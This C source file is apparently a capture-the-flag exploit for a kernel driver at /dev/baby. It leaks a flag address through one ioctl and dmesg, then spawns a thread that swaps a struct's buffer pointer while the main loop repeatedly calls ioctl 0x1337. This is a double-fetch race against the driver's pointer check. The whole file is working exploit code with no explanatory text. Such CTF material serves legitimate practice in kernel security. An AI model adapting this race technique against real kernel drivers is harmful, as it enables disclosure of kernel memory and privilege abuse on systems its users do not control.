#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<sys/mman.h>
#include<fcntl.h>
#include<pthread.h>
#include<unistd.h>
#include<sys/ioctl.h>

struct flag
{
	char * buf;
	size_t len;
};
struct flag * temp;// = (struct flag *)malloc(sizeof(struct flag));
char *fake_flag = "flag{1111_2222_3333_4444_5555_66}";
int finish = 0;
//char *addr;
void change_func(char *s)
{
	//struct flag *s1 = s;
	while(!finish)
	temp->buf = s;
	//s1->buf = addr;
}
int main()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
	char *addr;
	int fd = open("/dev/baby",O_RDWR);
	if(fd < 0)
	{
		printf("open failure!\n");
		exit(0);
	}
	int ret = ioctl(fd,0x6666);
	system("dmesg | grep flag");
	printf("Please input your flag is at :");
	scanf("%px",&addr);
	printf("Flag is at %p\n",addr);
	//struct flag * temp;
	temp =  (struct flag *)malloc(sizeof(struct flag));
	temp->buf = fake_flag;
	temp->len = 33;
	pthread_t tp;
	pthread_create(&tp,NULL,change_func,addr);
	for(int i=0;i<0x1000;i++)
	{
		ret = ioctl(fd,0x1337,temp);
		temp->buf = fake_flag;
		//printf("{==DBG==} addr: %p\n",temp->buf);
		//if(!ret)
		//	break;
	}
	finish = 1;
	pthread_join(tp,NULL);
	close(fd);
	system("dmesg | grep flag");
	return 0;
	
}

